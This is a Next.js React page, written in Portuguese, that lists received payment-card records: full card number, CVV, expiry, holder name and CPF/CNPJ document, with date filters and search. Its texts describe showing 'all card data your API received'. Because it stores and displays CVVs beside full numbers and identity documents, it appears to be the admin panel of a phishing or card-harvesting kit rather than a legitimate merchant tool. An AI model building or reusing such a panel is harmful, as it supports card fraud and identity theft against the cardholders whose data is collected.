'use client'

import { useEffect, useState } from 'react'
import Link from 'next/link'
import Sidebar from '@/components/Sidebar'
import { CreditCard, Search, Clock } from 'lucide-react'

type User = {
  id: string
  name: string
  email: string
}

// DADOS QUE VÃO CAIR DA API
type CardRow = {
  id: string
  cardNumber: string        // número (vem do backend, mascarado ou não)
  cvv: string               // cvv
  expiry: string            // validade: 12/29
  holderName: string        // nome impresso
  holderDocument?: string   // cpf/cnpj (opcional)
  createdAt: string
}

type Period = 'today' | 'yesterday' | 'last7' | 'last30' | 'all'

export default function CartoesPage() {
  const [user, setUser] = useState<User | null>(null)
  const [loadingUser, setLoadingUser] = useState(true)

  const [cards, setCards] = useState<CardRow[]>([])
  const [loadingCards, setLoadingCards] = useState(true)

  const [period, setPeriod] = useState<Period>('today')
  const [search, setSearch] = useState('')

  // ===== Helpers =====

  const formatDateTime = (iso: string) => {
    const d = new Date(iso)
    if (Number.isNaN(d.getTime())) return iso
    return d.toLocaleString('pt-BR', {
      day: '2-digit',
      month: '2-digit',
      year: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
    })
  }

  const fetchUser = async () => {
    try {
      const res = await fetch('/api/auth/me', {
        method: 'GET',
        credentials: 'include',
      })

      if (!res.ok) {
        setUser(null)
      } else {
        const data = await res.json()
        setUser(data)
      }
    } catch (err) {
      console.error('Erro ao buscar usuário', err)
      setUser(null)
    } finally {
      setLoadingUser(false)
    }
  }

  const fetchCards = async () => {
    setLoadingCards(true)
    try {
      const params = new URLSearchParams()

      if (period !== 'today') params.set('period', period)
      if (search.trim()) params.set('search', search.trim())

      const query = params.toString()
      const url = `/api/cartoes${query ? `?${query}` : ''}`

      const res = await fetch(url, {
        method: 'GET',
        credentials: 'include',
      })

      if (!res.ok) {
        setCards([])
        return
      }

      const data = await res.json()

      const rows: CardRow[] = Array.isArray(data.cards) ? data.cards : []
      setCards(rows)
    } catch (err) {
      console.error('Erro ao buscar cartões', err)
      setCards([])
    } finally {
      setLoadingCards(false)
    }
  }

  useEffect(() => {
    fetchUser()
  }, [])

  useEffect(() => {
    if (!user) return
    fetchCards()
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [user, period])

  // se quiser buscar ao digitar, descomenta:
  // useEffect(() => {
  //   if (!user) return
  //   const t = setTimeout(fetchCards, 400)
  //   return () => clearTimeout(t)
  // }, [search])

  // ===== Estados de loading / sem user =====

  if (loadingUser) {
    return (
      <main className="flex min-h-screen bg-[#050505] text-white">
        <aside className="w-64 border-r border-[#161616] bg-[#080808]" />
        <section className="flex-1 flex justify-center px-8 py-8">
          <div className="w-full max-w-6xl">
            <div className="h-6 w-40 rounded-full bg-[#141414]" />
            <div className="mt-6 h-40 rounded-3xl border border-[#161616] bg-[#080808]" />
          </div>
        </section>
      </main>
    )
  }

  if (!user) {
    return (
      <main className="flex min-h-screen items-center justify-center bg-[#050505] text-white">
        <div className="w-full max-w-sm rounded-2xl border border-[#191919] bg-[#080808] px-6 py-7 text-center">
          <p className="text-sm font-semibold">Sessão expirada</p>
          <p className="mt-2 text-xs text-white/55">
            Faça login novamente para acessar.
          </p>
          <Link
            href="/login"
            className="mt-5 inline-flex w-full items-center justify-center rounded-full bg-white/90 px-4 py-2 text-xs font-semibold text-black transition hover:bg-white"
          >
            Ir para login
          </Link>
        </div>
      </main>
    )
  }

  const periodLabelMap: Record<Period, string> = {
    all: 'Tudo que já foi enviado',
    today: 'Hoje (horário de Brasília)',
    yesterday: 'Ontem (horário de Brasília)',
    last7: 'Últimos 7 dias',
    last30: 'Últimos 30 dias',
  }

  const totalCards = cards.length

  return (
    <main className="flex min-h-screen bg-[#050505] text-white">
      <Sidebar user={user} />

      <section className="flex-1 overflow-y-auto px-8 py-8 flex justify-center">
        <div className="w-full max-w-6xl flex flex-col gap-8">
          {/* HEADER */}
          <header className="relative overflow-hidden rounded-3xl border border-[#202020] bg-gradient-to-br from-[#0b0b0b] via-[#080808] to-[#050505] px-6 py-6 shadow-[0_0_25px_rgba(0,0,0,0.4)]">
            <div className="pointer-events-none absolute inset-x-10 top-0 h-px bg-gradient-to-r from-transparent via-emerald-400/60 to-transparent" />
            <div className="pointer-events-none absolute -right-20 -top-20 h-40 w-40 rounded-full bg-emerald-500/10 blur-3xl" />
            <div className="relative flex flex-col md:flex-row md:items-center md:justify-between gap-4">
              <div className="flex-1 min-w-0">
                <h1 className="flex items-center gap-2 text-2xl font-semibold tracking-tight text-white">
                  <span className="inline-flex h-8 w-8 items-center justify-center rounded-full bg-emerald-500/15 border border-emerald-400/40">
                    <CreditCard className="h-4 w-4 text-emerald-300" />
                  </span>
                  Cartões – dados recebidos
                </h1>
                <p className="mt-1 max-w-md text-[12px] text-white/60">
                  Painel com todos os dados de cartões que a sua API recebeu:
                  número, validade, CVV, nome e documento.
                </p>
                <p className="mt-1 text-[11px] text-white/45">
                  Período selecionado:{' '}
                  <span className="text-white/75">
                    {periodLabelMap[period]}
                  </span>
                </p>
              </div>

              <div className="flex flex-col items-stretch gap-3 md:items-end">
                {/* Filtro de período */}
                <div className="flex flex-wrap gap-1.5 justify-end">
                  {([
                    { value: 'today', label: 'Hoje' },
                    { value: 'yesterday', label: 'Ontem' },
                    { value: 'last7', label: 'Últimos 7' },
                    { value: 'last30', label: 'Últimos 30' },
                    { value: 'all', label: 'Tudo' },
                  ] as { value: Period; label: string }[]).map((p) => {
                    const active = period === p.value
                    return (
                      <button
                        key={p.value}
                        type="button"
                        onClick={() => setPeriod(p.value)}
                        className={`rounded-full border px-3 py-1.5 text-[10px] transition ${
                          active
                            ? 'border-emerald-400 bg-emerald-500/15 text-emerald-200'
                            : 'border-white/10 bg-black/30 text-white/55 hover:border-white/25 hover:text-white/80'
                        }`}
                      >
                        {p.label}
                      </button>
                    )
                  })}
                </div>

                {/* Busca rápida */}
                <div className="flex items-center gap-2 rounded-full border border-white/10 bg-black/30 px-3 py-1.5 text-[11px]">
                  <Search className="h-3.5 w-3.5 text-white/35" />
                  <input
                    type="text"
                    value={search}
                    onChange={(e) => setSearch(e.target.value)}
                    placeholder="Buscar por número, nome ou CPF..."
                    className="w-40 bg-transparent text-[11px] text-white placeholder:text-white/30 focus:outline-none md:w-56"
                  />
                </div>
              </div>
            </div>
          </header>

          {/* CARD RESUMO – só total de cartões */}
          <section className="grid grid-cols-1 gap-4 md:grid-cols-1">
            <ResumoCardCartoes
              icon={CreditCard}
              label="Cartões recebidos"
              value={totalCards.toLocaleString('pt-BR')}
            />
          </section>

          {/* TABELA PRINCIPAL – SÓ DADOS DO CARTÃO */}
          <section className="relative rounded-3xl border border-[#1b1b1b] bg-gradient-to-br from-[#090909] via-[#050505] to-[#020202] px-5 py-5 md:px-7 md:py-6 overflow-hidden">
            <div className="pointer-events-none absolute inset-x-6 top-0 h-px bg-gradient-to-r from-transparent via-emerald-500/60 to-transparent" />
            <div className="pointer-events-none absolute -right-24 -top-24 h-40 w-40 rounded-full bg-emerald-500/10 blur-3xl" />

            <div className="relative mb-4 flex flex-col gap-3 md:flex-row md:items-center md:justify-between">
              <div>
                <h2 className="text-sm font-semibold">Lista de cartões</h2>
                <p className="mt-1 text-[11px] text-white/55">
                  Visualize os dados principais de cada cartão recebido pela API:
                  número, validade, CVV, nome e documento.
                </p>
              </div>
            </div>

            {loadingCards ? (
              <div className="h-32 rounded-2xl border border-[#202020] bg-[#080808]" />
            ) : cards.length === 0 ? (
              <div className="relative rounded-2xl border border-dashed border-[#262626] bg-[#080808] px-5 py-6 text-xs text-white/60">
                Nenhum cartão encontrado para os filtros atuais.
                <br />
                <span className="text-white/45">
                  Assim que sua API receber os dados de cartões, eles aparecem
                  aqui automaticamente.
                </span>
              </div>
            ) : (
              <div className="relative overflow-hidden rounded-2xl border border-[#202020] bg-[#080808]">
                <table className="min-w-full border-collapse text-[11px]">
                  <thead className="bg-black/40 text-white/50">
                    <tr>
                      <th className="px-4 py-2 text-left font-normal">
                        Cartão
                      </th>
                      <th className="px-4 py-2 text-left font-normal">
                        Dados
                      </th>
                      <th className="px-4 py-2 text-right font-normal">
                        Data
                      </th>
                    </tr>
                  </thead>
                  <tbody>
                    {cards.map((c) => (
                      <tr
                        key={c.id}
                        className="border-t border-[#262626] hover:bg-white/[0.02] transition-colors"
                      >
                        {/* cartão (número + nome) */}
                        <td className="px-4 py-3 align-top">
                          <div className="flex items-center gap-2">
                            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-white/5 text-[10px] font-semibold uppercase">
                              CC
                            </div>
                            <div className="flex flex-col">
                              <span className="text-[11px] font-semibold text-white/85">
                                {c.cardNumber || '**** **** **** ****'}
                              </span>
                              <span className="text-[10px] text-white/45">
                                {c.holderName || 'Nome não informado'}
                              </span>
                            </div>
                          </div>
                        </td>

                        {/* dados: validade, cvv, cpf */}
                        <td className="px-4 py-3 align-top text-[10px] text-white/70">
                          <div className="flex flex-col gap-0.5">
                            <span>
                              <span className="text-white/40">Validade:</span>{' '}
                              {c.expiry || '-'}
                            </span>
                            <span>
                              <span className="text-white/40">CVV:</span>{' '}
                              {c.cvv || '***'}
                            </span>
                            <span>
                              <span className="text-white/40">Documento:</span>{' '}
                              {c.holderDocument || '-'}
                            </span>
                          </div>
                        </td>

                        {/* data */}
                        <td className="px-4 py-3 align-middle text-right text-[10px] text-white/50 whitespace-nowrap">
                          <span className="inline-flex items-center gap-1">
                            <Clock className="h-3 w-3" />
                            {formatDateTime(c.createdAt)}
                          </span>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </section>
        </div>
      </section>
    </main>
  )
}

/* ==== COMPONENTE RESUMO (topo) ==== */

function ResumoCardCartoes({
  icon: Icon,
  label,
  value,
  accent,
}: {
  icon: React.ComponentType<{ className?: string }>
  label: string
  value: string
  accent?: 'green' | 'red'
}) {
  const accentClass =
    accent === 'green'
      ? 'text-emerald-300'
      : accent === 'red'
      ? 'text-red-300'
      : 'text-white'

  const glowClass =
    accent === 'green'
      ? 'bg-emerald-500/12'
      : accent === 'red'
      ? 'bg-red-500/12'
      : 'bg-white/5'

  return (
    <div
      className="
        relative rounded-2xl border border-[#1f1f1f]
        bg-gradient-to-br from-[#0b0b0b] via-[#090909] to-[#050505]
        px-5 py-4 shadow-[0_0_20px_rgba(0,0,0,0.35)]
        hover:shadow-[0_0_35px_rgba(0,0,0,0.55)]
        transition-all duration-300 overflow-hidden
      "
    >
      <div className="pointer-events-none absolute inset-x-6 top-0 h-px bg-gradient-to-r from-transparent via-white/15 to-transparent" />

      <div
        className={`pointer-events-none absolute -right-14 -top-14 h-24 w-24 rounded-full ${glowClass} blur-2xl`}
      />

      <div className="relative flex items-center justify-between gap-2">
        <div className="flex flex-col gap-1">
          <p className="text-[11px] text-white/55">{label}</p>
          <p className={`text-lg font-semibold tracking-tight ${accentClass}`}>
            {value}
          </p>
        </div>

        <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-black/30 border border-white/5">
          <Icon className="h-4.5 w-4.5 text-white/70" />
        </div>
      </div>
    </div>
  )
}
